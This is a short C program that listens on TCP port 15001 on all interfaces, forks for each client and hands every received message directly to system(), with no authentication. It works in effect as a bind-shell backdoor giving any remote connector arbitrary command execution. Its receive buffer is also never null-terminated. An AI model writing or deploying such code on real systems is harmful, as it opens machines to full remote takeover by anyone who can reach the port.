#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <arpa/inet.h>


void remote_command(int connfd, int port)
{
    int n;
    int bufsize = 1024;
    char *buffer = malloc(bufsize);
    do
    {
        while ((n = recv(connfd, buffer, bufsize, 0)) > 0)
        {
            send(connfd, buffer, n, 0);
            printf("Port: %d\n", port);
            system(buffer); //for reading commands
        }
    } while (n < 0); //EOF
}


int main()
{
    int cont, listenfd, connfd, addrlen, fd, pid;
    struct sockaddr_in address;
    if ((listenfd = socket(AF_INET, SOCK_STREAM, 0)) > 0) //create socket
        printf("The socket was created.\n");
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(15001);

    if (bind(listenfd, (struct sockaddr *)&address, sizeof(address)) == 0) //binding socket
            printf("Binding Socket\n");

    listen(listenfd, 3); //listen
    printf("Server is listening.\n");
    for (;;)
    {
        addrlen = sizeof(struct sockaddr_in);
        connfd = accept(listenfd, (struct sockaddr *)&address, &addrlen);
        //accept
        if (connfd > 0)
        {
            printf("The client %s is connected.\n",
                   inet_ntoa(address.sin_addr));
        }
        if ((pid = fork()) == 0)
        {
            printf("Inside Child\n");
            close(listenfd);
            remote_command(connfd, htons(address.sin_port));
            exit(0);
        }
        close(connfd);
    }
    return 0;
}